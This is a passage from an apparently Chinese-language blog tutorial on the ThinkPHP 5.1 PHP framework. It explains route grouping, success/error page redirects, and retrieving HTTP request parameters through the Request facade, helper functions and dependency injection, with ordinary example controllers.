+<h3 id="路由分组"><a href="#路由分组" class="headerlink" title="路由分组"></a>路由分组</h3><p>路由分组功能允许把相同前缀的路由定义合并分组，简化路由定义，提高路由匹配效率，不必每次都去遍历完整的路由规则。</p>
+<p>使用Route类的group方法进行注册：</p>
+<blockquote>
+<p>Route::group(‘分组名（字符串）或者分组路由参数（数组）’,’分组路由规则（数组或者闭包）’);</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//route.php</span></div><div class="line"></div><div class="line">Route::group(<span class="string">'admin'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</div><div class="line">    Route::get(<span class="string">'login/[:id]'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($id=<span class="number">0</span>)</span></span>&#123; <span class="comment">// 设置参数默认值</span></div><div class="line">        <span class="keyword">return</span> <span class="string">"ok, id: "</span>.$id;</div><div class="line">    &#125;);</div><div class="line">    Route::get(<span class="string">'logout/:id'</span>, <span class="string">'demo/Test/firstmethod'</span>);</div><div class="line">    Route::get(<span class="string">'checkuser/:id'</span>, <span class="string">'demo/Test/firstmethod'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="comment">//Route::group(['method'=&gt;'get'], function ()&#123;</span></div><div class="line"><span class="comment">//   Route::group('admin', function ()&#123;</span></div><div class="line"><span class="comment">//       Route::get('login/[:id]', function ($id=0)&#123; // 设置参数默认值</span></div><div class="line"><span class="comment">//           return "ok, id: ".$id;</span></div><div class="line"><span class="comment">//       &#125;);</span></div><div class="line"><span class="comment">//    Route::get('logout/:id', 'demo/Test/firstmethod');</span></div><div class="line"><span class="comment">//    Route::get('checkuser/:id', 'demo/Test/firstmethod');</span></div><div class="line"><span class="comment">//   &#125;);</span></div><div class="line"><span class="comment">//&#125;);</span></div></pre></td></tr></table></figure>
+<p>访问：<br><code>http://localhost/tp5/public/index.php/admin/login/1</code><br><img src="/2020/01/19/thinkphp/thinkphp-luyou-args-07.png" alt="thinkphp-luyou-args-07"></p>
+<h3 id="页面跳转"><a href="#页面跳转" class="headerlink" title="页面跳转"></a>页面跳转</h3><p>在应用开发中，经常会遇到一些带有提示信息的跳转页面，例如操作成功或者操作错误页面，并且自动跳转到另外一个目标页面。<br>系统的\think\Controller类内置了两个跳转方法success和error，用于页面跳转提示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Created by PhpStorm.</span></div><div class="line"><span class="comment"> * User: lxhsec</span></div><div class="line"><span class="comment"> * Date: 2020/1/23</span></div><div class="line"><span class="comment"> * Time: 16:26</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="comment">//        return $this-&gt;success("登陆成功",'demo/test/login');</span></div><div class="line"></div><div class="line">        <span class="comment">// 使用url生成动态地址</span></div><div class="line">        <span class="comment">// 同控制器下面可以直接写方法名</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;success(<span class="string">"登陆成功"</span>,url(<span class="string">'login'</span>));</div><div class="line"></div><div class="line">        <span class="comment">// 不同的控制器下面可以写控制器名/方法名</span></div><div class="line"><span class="comment">//        return $this-&gt;success("登陆成功",url('Test/login'));</span></div><div class="line"><span class="comment">//        return $this-&gt;error("登陆失败");</span></div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"登陆成功。"</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><img src="/2020/01/19/thinkphp/thinkphp-luyou-forward-01.png" alt="thinkphp-luyou-forward-01"></p>
+<p>跳转地址是可选的，success方法的默认跳转地址是<code>$_SERVER[&quot;HTTP_REFERER&quot;]</code>，<br>事例给了跳转地址，因此跳转如下：<br><img src="/2020/01/19/thinkphp/thinkphp-luyou-forward-02.png" alt="thinkphp-luyou-forward-02"></p>
+<p>error方法的默认跳转地址是<code>javascript:history.back(-1);</code>。</p>
+<p>默认的等待时间都是3秒。</p>
+<h3 id="HTTP请求参数"><a href="#HTTP请求参数" class="headerlink" title="HTTP请求参数"></a>HTTP请求参数</h3><h4 id="Facade方式获取请求参数"><a href="#Facade方式获取请求参数" class="headerlink" title="Facade方式获取请求参数"></a>Facade方式获取请求参数</h4><p>首先引用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Request</span>;</div></pre></td></tr></table></figure></p>
+<h5 id="检测变量是否设置"><a href="#检测变量是否设置" class="headerlink" title="检测变量是否设置"></a>检测变量是否设置</h5><p>可以使用has方法来检测一个变量参数是否设置，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 检测一个变量参数是否设置</span></div><div class="line">dump(Request::has(<span class="string">'urls'</span>,<span class="string">'get'</span>)); <span class="comment">// 检测get请求方式中参数是否有urls</span></div><div class="line"></div><div class="line">dump(Request::has(<span class="string">'urls'</span>)); <span class="comment">// 检测所有请求方式中是否包含该值。</span></div></pre></td></tr></table></figure></p>
+<h5 id="变量获取"><a href="#变量获取" class="headerlink" title="变量获取"></a>变量获取</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Request::变量类型方法(&apos;变量名/变量修饰符&apos;,&apos;默认值&apos;,&apos;过滤方法&apos;)</div></pre></td></tr></table></figure>
+<p>变量类型方法有:</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>param</td>
+<td>获取当前请求的变量</td>
+</tr>
+<tr>
+<td>get</td>
+<td>获取 $_GET 变量</td>
+</tr>
+<tr>
+<td>post</td>
+<td>获取 $_POST 变量</td>
+</tr>
+<tr>
+<td>put</td>
+<td>获取 PUT 变量</td>
+</tr>
+<tr>
+<td>delete</td>
+<td>获取 DELETE 变量</td>
+</tr>
+<tr>
+<td>session</td>
+<td>获取 $_SESSION 变量</td>
+</tr>
+<tr>
+<td>cookie</td>
+<td>获取 $_COOKIE 变量</td>
+</tr>
+<tr>
+<td>request</td>
+<td>获取 $_REQUEST 变量</td>
+</tr>
+<tr>
+<td>server</td>
+<td>获取 $_SERVER 变量</td>
+</tr>
+<tr>
+<td>env</td>
+<td>获取 $_ENV 变量</td>
+</tr>
+<tr>
+<td>route</td>
+<td>获取 路由（包括PATHINFO） 变量</td>
+</tr>
+<tr>
+<td>file</td>
+<td>获取 $_FILES 变量</td>
+</tr>
+</tbody>
+</table>
+<p>route.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Route</span>;</div><div class="line"></div><div class="line">Route::get(<span class="string">'test'</span>, <span class="string">'demo/Test/test'</span>);</div><div class="line"></div><div class="line">Route::post(<span class="string">'test'</span>, <span class="string">'demo/Test/test'</span>);</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Request</span>;</div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="comment">// 获取get请求变量url ,默认值为www.lxhsec.com</span></div><div class="line">        <span class="comment">// 并用htmlspecialchars函数过滤，多个过滤用逗号隔开。 </span></div><div class="line">	<span class="comment">//Request::get('url',"www.lxhsec.com",'strip_tags,strtolower')</span></div><div class="line">	<span class="comment">// 请求参数不包含url时，返回默认值</span></div><div class="line">        <span class="keyword">echo</span> Request::get(<span class="string">'url'</span>,<span class="string">"www.lxhsec.com"</span>,<span class="string">'htmlspecialchars'</span>);</div><div class="line"></div><div class="line">        <span class="comment">// 请求参数不包含urls时返回NULL。</span></div><div class="line">        dump(Request::get(<span class="string">'urls'</span>)); </div><div class="line"></div><div class="line">        <span class="keyword">echo</span> PHP_EOL;</div><div class="line"></div><div class="line">        <span class="comment">//获取get请求方法的所有参数</span></div><div class="line">        dump(Request::get()); </div><div class="line"><span class="comment">//        dump(Request::post());</span></div><div class="line"><span class="comment">//        dump(Request::put());</span></div><div class="line"><span class="comment">//        dump(Request::param('url')); // 获取任意请求方式的参数。</span></div><div class="line"><span class="comment">//        ...</span></div><div class="line"></div><div class="line">        <span class="keyword">echo</span> PHP_EOL;</div><div class="line"></div><div class="line">        <span class="comment">// 检测一个变量参数是否设置</span></div><div class="line">        dump(Request::has(<span class="string">'urls'</span>,<span class="string">'get'</span>)); <span class="comment">// 检测get参数是否有urls</span></div><div class="line"></div><div class="line">        dump(Request::has(<span class="string">'urls'</span>)); <span class="comment">// 检测所有请求方式中是否包含该值。</span></div><div class="line"></div><div class="line">        dump(Request::isGet()); <span class="comment">// 判断请求方式</span></div><div class="line"><span class="comment">//        dump(Request::isAjax());</span></div><div class="line"><span class="comment">//        dump(Request::isPost());</span></div><div class="line"><span class="comment">//        ...</span></div><div class="line"></div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-01.png" alt="thinkphp-http-args-01"></p>
+<p><strong>Note:</strong>变量名区分大小写，除了server和env方法的变量名不区分大小写（会自动转为大写后获取）。</p>
+<h5 id="获取部分变量"><a href="#获取部分变量" class="headerlink" title="获取部分变量"></a>获取部分变量</h5><p>如果你只需要获取当前请求的部分参数，可以使用<code>Request::only</code> or <code>Request::except</code>.</p>
+<p>route.php不变，参见上一章。</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Request</span>;</div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="comment">//白名单 only， 黑名单 except</span></div><div class="line">        <span class="comment">// 只获取当前请求的url和name,nickname变量</span></div><div class="line">        dump(Request::only(<span class="string">'url,name,nickname'</span>));</div><div class="line">        <span class="comment">// 或者使用数组方式</span></div><div class="line">        <span class="comment">// dump(Request::only(['url','name']));</span></div><div class="line"></div><div class="line">        <span class="comment">// 只获取GET请求的url和name变量</span></div><div class="line">        <span class="comment">// dump(Request::only(['url','name'], 'get'));</span></div><div class="line"></div><div class="line">        <span class="comment">//V5.1.3+版本开始，only方法可以支持批量设置默认值，如下：</span></div><div class="line">        <span class="comment">// 设置默认值</span></div><div class="line">        <span class="comment">// dump(Request::only(['url'=&gt;'www.lxhsec.com','name'=&gt;'']));</span></div><div class="line"></div><div class="line">        <span class="comment">//排除url,name变量后获取其余参数</span></div><div class="line">        dump(Request::except(<span class="string">'url,name'</span>));</div><div class="line"></div><div class="line">        <span class="comment">//或者使用数组方式</span></div><div class="line">        <span class="comment">// dump(Request::except(['url','name']));</span></div><div class="line"></div><div class="line">        <span class="comment">// dump(Request::except(['url','name'],'get'));</span></div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-02.png" alt="thinkphp-http-args-02"></p>
+<h5 id="变量修饰符"><a href="#变量修饰符" class="headerlink" title="变量修饰符"></a>变量修饰符</h5><p>支持对变量使用修饰符功能，可以一定程度上简单过滤变量。</p>
+<p>默认的变量修饰符是/s（V5.1.16+版本开始取消默认修饰符）。</p>
+<p>如果需要传入字符串之外的变量可以使用下面的修饰符，</p>
+<table>
+<thead>
+<tr>
+<th>修饰符</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>s</td>
+<td>强制转换为字符串类型</td>
+</tr>
+<tr>
+<td>d</td>
+<td>强制转换为整型类型</td>
+</tr>
+<tr>
+<td>b</td>
+<td>强制转换为布尔类型</td>
+</tr>
+<tr>
+<td>a</td>
+<td>强制转换为数组类型</td>
+</tr>
+<tr>
+<td>f</td>
+<td>强制转换为浮点类型</td>
+</tr>
+</tbody>
+</table>
+<p>例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dump(Request::get(<span class="string">'url/s'</span>));</div><div class="line">dump(Request::get(<span class="string">'debug/d'</span>));</div><div class="line">dump(Request::get(<span class="string">'arr/a'</span>));</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-03.png" alt="thinkphp-http-args-03"></p>
+<p><strong>Note:</strong>如果你要获取的数据为数组，请一定注意要加上<code>/a</code> 修饰符才能正确获取到。</p>
+<h5 id="助手函数"><a href="#助手函数" class="headerlink" title="助手函数"></a>助手函数</h5><p>为了简化使用，还可以使用系统提供的input助手函数完成上述大部分功能。</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"助手函数 input()"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</div><div class="line"></div><div class="line">        dump(input(<span class="string">'?get.url'</span>)); <span class="comment">// 判断get请求方式 是否定义url参数</span></div><div class="line"></div><div class="line">        dump(input(<span class="string">'get.url'</span>)); <span class="comment">// 获取单个参数</span></div><div class="line">        dump(input(<span class="string">'get.'</span>)); <span class="comment">// 获取全部参数</span></div><div class="line"></div><div class="line">        <span class="comment">// 下面是等效的</span></div><div class="line">        <span class="comment">// input('url');</span></div><div class="line">        <span class="comment">// input('');</span></div><div class="line"></div><div class="line">        <span class="comment">//使用过滤方法,设置默认值</span></div><div class="line"></div><div class="line">        dump(input(<span class="string">'get.urls'</span>,<span class="string">'www.lxhsec.com'</span>,<span class="string">'htmlspecialchars'</span>));</div><div class="line"></div><div class="line">        <span class="comment">//使用变量修饰符</span></div><div class="line">        dump(input(<span class="string">'get.arr/a'</span>));</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-08.png" alt="thinkphp-http-args-08"></p>
+<h4 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h4><h5 id="操作方法注入"><a href="#操作方法注入" class="headerlink" title="操作方法注入"></a>操作方法注入</h5><p>不需要继承系统的控制器基类。</p>
+<p>首先引用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">	<span class="comment">//在操作的方法上注入Request对象</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(Request $req)</span></span>&#123;</div><div class="line">        <span class="keyword">echo</span> $req-&gt;get(<span class="string">'url'</span>);</div><div class="line"></div><div class="line">        dump($req-&gt;has(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump($req-&gt;only([<span class="string">'url'</span>]));</div><div class="line"></div><div class="line">        dump($req-&gt;except(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump($req-&gt;get());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-04.png" alt="thinkphp-http-args-04"></p>
+<h5 id="构造方法注入"><a href="#构造方法注入" class="headerlink" title="构造方法注入"></a>构造方法注入</h5><h6 id="不继承系统的控制器基类"><a href="#不继承系统的控制器基类" class="headerlink" title="不继承系统的控制器基类"></a>不继承系统的控制器基类</h6><p>首先引用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">protected</span> $req;</div><div class="line">	</div><div class="line">    <span class="comment">//构造方法注入</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Request $request)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;req = $request;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"不继承控制器基类的依赖注入"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'url: '</span>.<span class="keyword">$this</span>-&gt;req-&gt;get(<span class="string">'url'</span>);</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;req-&gt;has(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;req-&gt;only([<span class="string">'url'</span>]));</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;req-&gt;except(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;req-&gt;get());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-05.png" alt="thinkphp-http-args-05"></p>
+<h6 id="继承系统的控制器基类"><a href="#继承系统的控制器基类" class="headerlink" title="继承系统的控制器基类"></a>继承系统的控制器基类</h6><p>如果 类 继承了 thinkphp的控制器基类<code>think\Controller</code>，thinkphp会自动完成请求对象的构造方法注入，我们可以直接使用<code>$this-&gt;request</code>属性调用当前的请求。</p>
+<p>首先引用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div></pre></td></tr></table></figure></p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"继承控制器基类的依赖注入"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'url: '</span>.<span class="keyword">$this</span>-&gt;request-&gt;get(<span class="string">'url'</span>);</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;request-&gt;has(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;request-&gt;only([<span class="string">'url'</span>]));</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;request-&gt;except(<span class="string">'url'</span>));</div><div class="line"></div><div class="line">        dump(<span class="keyword">$this</span>-&gt;request-&gt;get());</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p><img src="/2020/01/19/thinkphp/thinkphp-args-06.png" alt="thinkphp-http-args-06"></p>
+<h4 id="助手函数-1"><a href="#助手函数-1" class="headerlink" title="助手函数"></a>助手函数</h4><p>为了简化调用，thinkphp 提供了request助手函数，可以在任何需要的时候直接调用当前请求对象。</p>
+<p>Test.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">demo</span>\<span class="title">controller</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">"助手函数 request()"</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">echo</span> <span class="string">'url: '</span>.request()-&gt;get(<span class="string">'url'</span>);</div><div class="line"></div><div class="line">        